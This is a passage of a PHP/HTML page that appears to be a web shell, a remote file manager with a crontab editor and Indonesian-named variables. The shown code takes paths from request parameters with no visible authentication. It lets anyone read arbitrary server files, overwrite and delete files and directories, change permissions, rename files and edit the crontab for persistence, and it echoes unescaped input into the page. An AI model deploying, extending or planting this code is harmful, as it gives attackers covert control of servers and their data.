    background: #2d3748;
    border: 1px solid #4a5568;
    border-radius: 8px;
    color: #e2e8f0;
    padding: 15px;
    font-family: 'Courier New', monospace;
    font-size: 13px;
    line-height: 1.5;
    resize: vertical;
    transition: border-color 0.3s ease;
}

.cron-textarea:focus {
    outline: none;
    border-color: #63b3ed;
    box-shadow: 0 0 0 2px rgba(99, 179, 237, 0.1);
}

.cron-textarea::placeholder {
    color: #a0aec0;
}

.cron-help {
    color: #a0aec0;
    font-size: 12px;
    margin-top: 8px;
    display: flex;
    align-items: center;
    gap: 6px;
}


.cron-save {
    background: #3182ce;
    border: 1px solid #3182ce;
    color: white;
    padding: 10px 20px;
    border-radius: 6px;
    font-weight: 600;
    transition: all 0.3s ease;
    display: flex;
    align-items: center;
    gap: 6px;
}

/* LOADING STATE */
.cron-textarea:disabled {
    opacity: 0.6;
    cursor: not-allowed;
}
</style>

<script>
// Cron Manager
const cronModal = new bootstrap.Modal(document.getElementById('cronManagerModal'));

$('#cronManagerBtn').on('click', function() {
    const $textarea = $('#cronJobsTextarea');
    const $saveBtn = $('#saveCronBtn');
    
    $textarea.val('Loading crontab...').prop('disabled', true);
    $saveBtn.prop('disabled', true);
    
    apiCall('cron_manager', { sub_action: 'list' })
        .done(response => {
            if (response.success) {
                $textarea.val(response.cron_jobs).prop('disabled', false);
                $saveBtn.prop('disabled', false);
                cronModal.show();
            } else {
                showError(response.message);
            }
        })
        .fail(() => {
            showError('Could not retrieve crontab.');
            $textarea.val('Error loading crontab').prop('disabled', true);
        });
});

$('#saveCronBtn').on('click', function() {
    const $btn = $(this);
    const jobs = $('#cronJobsTextarea').val();
    
    $btn.prop('disabled', true).html('<i class="fa-solid fa-spinner fa-spin"></i> Saving...');
    
    apiCall('cron_manager', { sub_action: 'save', jobs: jobs })
        .done(response => {
            if (response.success) {
                showSuccess(response.message);
                cronModal.hide();
            } else {
                showError(response.message);
            }
        })
        .fail(() => showError('Failed to save crontab.'))
        .always(() => {
            $btn.prop('disabled', false).html('<i class="fa-solid fa-save"></i> Save Crontab');
        });
});

// Enable save button when user types
$('#cronJobsTextarea').on('input', function() {
    $('#saveCronBtn').prop('disabled', false);
});

// Reset when modal closes
$('#cronManagerModal').on('hidden.bs.modal', function() {
    $('#cronJobsTextarea').val('').prop('disabled', false);
    $('#saveCronBtn').prop('disabled', true).html('<i class="fa-solid fa-save"></i> Save Crontab');
});
</script>
        </div>

        <script>
        function openCity(evt, cityName) {
        var i, tabcontent, tablinks;
        tabcontent = document.getElementsByClassName("tabcontent");
        for (i = 0; i < tabcontent.length; i++) {
            tabcontent[i].style.display = "none";
        }
        tablinks = document.getElementsByClassName("tablinks");
        for (i = 0; i < tablinks.length; i++) {
            tablinks[i].className = tablinks[i].className.replace(" active", "");
        }
        document.getElementById(cityName).style.display = "block";
        evt.currentTarget.className += " active";
        }
        </script>
        <div class="breadcrumb">
            <?php
            foreach($_POST as $key => $value){
                $_POST[$key] = stripslashes($value);
            }

            if(isset($_GET['path'])){
                $lokasi = $_GET['path'];
                $lokdua = $_GET['path'];
            } else {
                $lokasi = getcwd();
                $lokdua = getcwd();
            }

            $lokasi = str_replace('\\','/',$lokasi);
            $lokasis = explode('/',$lokasi);
            $lokasinya = @scandir($lokasi);

            echo ">= pwd: ";
            foreach($lokasis as $id => $lok){
                if($lok == '' && $id == 0){
                    $a = true;
                    echo '<a href="?path=/">/</a>';
                    continue;
                }
                if($lok == '') continue;
                echo '<a href="?path=';
                for($i=0;$i<=$id;$i++){
                    echo "$lokasis[$i]";
                    if($i != $id) echo "/";
                } 
                echo '">'.$lok.'</a>/';
            }
            ?>
        </div>
        <?php
        if (isset($_GET['fileloc'])) {
            echo "<div class='file-preview'>";
            echo "<div class='section-title'>File: ".$_GET['fileloc']."</div>";
            echo "<pre>".htmlspecialchars(file_get_contents($_GET['fileloc']))."</pre>";
            echo "</div>";
            author();
        } elseif (isset($_GET['pilihan']) && $_POST['pilih'] == "hapus") {
            if (is_dir($_POST['path'])) {
                xrmdir($_POST['path']);
                if (file_exists($_POST['path'])) {
                    red("Failed to delete directory");
                } else {
                    green("Directory deleted");
                }
            } elseif (is_file($_POST['path'])) {
                @unlink($_POST['path']);
                if (file_exists($_POST['path'])) {
                    red("Failed to delete file");
                } else {
                    green("File deleted");
                }
            }
        } elseif (isset($_GET['pilihan']) && $_POST['pilih'] == "ubahmod") {
            echo "<div class='edit-form'>";
            echo "<div class='section-title'>chmod ".$_POST['path']."</div>";
            echo '<form method="post">
            <div class="form-row">
                <input name="perm" type="text" size="4" value="'.substr(sprintf('%o', fileperms($_POST['path'])), -4).'" placeholder="0644" />
                <input type="hidden" name="path" value="'.$_POST['path'].'">
                <input type="hidden" name="pilih" value="ubahmod">
                <button type="submit" name="chm0d" class="btn btn-primary">Apply</button>
            </div>
            </form>';
            if (isset($_POST['chm0d'])) {
                $cm = @chmod($_POST['path'], $_POST['perm']);
                if ($cm == true) {
                    green("Permission changed");
                } else {
                    red("Permission change failed");
                }
            }
            echo "</div>";
        } elseif (isset($_GET['pilihan']) && $_POST['pilih'] == "gantinama") {
            if (isset($_POST['gantin'])) {
                $ren = @rename($_POST['path'], $_POST['newname']);
                if ($ren == true) {
                    green("Renamed successfully");
                } else {
                    red("Rename failed");
                }
            }
            if (empty($_POST['name'])) {
                $namaawal = $_POST['newname'];
            } else {
                $namawal = $_POST['name'];
            }
            echo "<div class='edit-form'>";
            echo "<div class='section-title'>mv ".$_POST['path']."</div>";
            echo '<form method="post">
            <div class="form-row">
                <input name="newname" type="text" value="'.$namaawal.'" placeholder="new name" />
                <input type="hidden" name="path" value="'.$_POST['path'].'">
                <input type="hidden" name="pilih" value="gantinama">
                <button type="submit" name="gantin" class="btn btn-primary">Rename</button>
            </div>
            </form>';
            echo "</div>";
        } elseif (isset($_GET['pilihan']) && $_POST['pilih'] == "edit") {
            if (isset($_POST['gasedit'])) {
                $edit = @file_put_contents($_POST['path'], $_POST['src']);
                if ($edit == true) {
                    green("File saved");
                } else {
                    red("Save failed");
                }
            }
            echo "<div class='edit-form'>";
            echo "<div class='section-title'>nano ".$_POST['path']."</div>";
            echo '<form method="post">
            <textarea name="src">'.htmlspecialchars(file_get_contents($_POST['path'])).'</textarea>
            <div class="form-row">
                <input type="hidden" name="path" value="'.$_POST['path'].'">
                <input type="hidden" name="pilih" value="edit">
                <button type="submit" name="gasedit" class="btn btn-primary">Save</button>
            </div>
            </form>';
            echo "</div>";
        }
        ?>
        <div class="file-table">
            <table>
                <thead>
                    <tr>
                        <th>Name</th>
                        <th style="width: 80px;">Size</th>
                        <th style="width: 100px;">Permissions</th>
                        <th style="width: 120px;">Actions</th>
                    </tr>
                </thead>
                <tbody>
                    <?php
                    foreach($lokasinya as $dir){
                        if(!is_dir($lokasi."/".$dir) || $dir == '.' || $dir == '..') continue;
                        echo "<tr>
                        <td>
                            <a href=\"?path=".$lokasi."/".$dir."\" class='file-link dir-link'>
                                📁 ".$dir."
                            </a>
                        </td>
                        <td class='size'>--</td>
                        <td class='permissions ";
                        if(is_writable($lokasi."/".$dir)) echo 'writable';
                        elseif(!is_readable($lokasi."/".$dir)) echo 'readonly';
                        echo "'>".statusnya($lokasi."/".$dir)."</td>
                        <td>
                            <form method='POST' action='?pilihan&path=$lokasi' class='action-form'>
                                <select name='pilih'>
                                    <option value=''>--</option>
                                    <option value='hapus'>rm</option>
                                    <option value='ubahmod'>chmod</option>
                                    <option value='gantinama'>mv</option>
                                </select>
                                <input type='hidden' name='type' value='dir'>
                                <input type='hidden' name='name' value='$dir'>
                                <input type='hidden' name='path' value='$lokasi/$dir'>
                                <button type='submit' class='btn'>go</button>
                            </form>
                        </td>
                        </tr>";
                    }

                    foreach($lokasinya as $file) {
                        if(!is_file("$lokasi/$file")) continue;
                        $size = filesize("$lokasi/$file")/1024;
                        $size = round($size,3);
                        if($size >= 1024){
                            $size = round($size/1024,2).'M';
                        } else {
                            $size = $size.'K';
                        }

                        echo "<tr>
                        <td>
                            <a href=\"?fileloc=$lokasi/$file&path=$lokasi\" class='file-link'>
                                📄 $file
                            </a>
                        </td>
                        <td class='size'>".$size."</td>
                        <td class='permissions ";
                        if(is_writable("$lokasi/$file")) echo 'writable';
                        elseif(!is_readable("$lokasi/$file")) echo 'readonly';
                        echo "'>".statusnya("$lokasi/$file")."</td>
                        <td>
                            <form method='post' action='?pilihan&path=$lokasi' class='action-form'>
                                <select name='pilih'>
                                    <option value=''>--</option>
                                    <option value='hapus'>rm</option>
                                    <option value='ubahmod'>chmod</option>
                                    <option value='gantinama'>mv</option>
                                    <option value='edit'>nano</option>
                                </select>
                                <input type='hidden' name='type' value='file'>
                                <input type='hidden' name='name' value='$file'>
                                <input type='hidden' name='path' value='$lokasi/$file'>
                                <button type='submit' class='btn'>go</button>
                            </form>
                        </td>
                        </tr>";
                    }
                    ?>
                </tbody>
            </table>
        </div>

        <?php
        author();

        function statusnya($file){
            $statusnya = fileperms($file);

            if (($statusnya & 0xC000) == 0xC000) {
                $ingfo = 's';
            } elseif (($statusnya & 0xA000) == 0xA000) {
                $ingfo = 'l';
            } elseif (($statusnya & 0x8000) == 0x8000) {
                $ingfo = '-';
            } elseif (($statusnya & 0x6000) == 0x6000) {
                $ingfo = 'b';
            } elseif (($statusnya & 0x4000) == 0x4000) {
                $ingfo = 'd';
            } elseif (($statusnya & 0x2000) == 0x2000) {
                $ingfo = 'c';
            } elseif (($statusnya & 0x1000) == 0x1000) {
                $ingfo = 'p';
            } else {
                $ingfo = 'u';
            }

            $ingfo .= (($statusnya & 0x0100) ? 'r' : '-');
            $ingfo .= (($statusnya & 0x0080) ? 'w' : '-');
            $ingfo .= (($statusnya & 0x0040) ?
                (($statusnya & 0x0800) ? 's' : 'x' ) :
                (($statusnya & 0x0800) ? 'S' : '-'));

            $ingfo .= (($statusnya & 0x0020) ? 'r' : '-');
            $ingfo .= (($statusnya & 0x0010) ? 'w' : '-');
            $ingfo .= (($statusnya & 0x0008) ?
                (($statusnya & 0x0400) ? 's' : 'x' ) :
                (($statusnya & 0x0400) ? 'S' : '-'));

            $ingfo .= (($statusnya & 0x0004) ? 'r' : '-');
            $ingfo .= (($statusnya & 0x0002) ? 'w' : '-');
            $ingfo .= (($statusnya & 0x0001) ?
                (($statusnya & 0x0200) ? 't' : 'x' ) :
                (($statusnya & 0x0200) ? 'T' : '-'));

            return $ingfo;
        }
        ?>
    </div>
</body>
</html>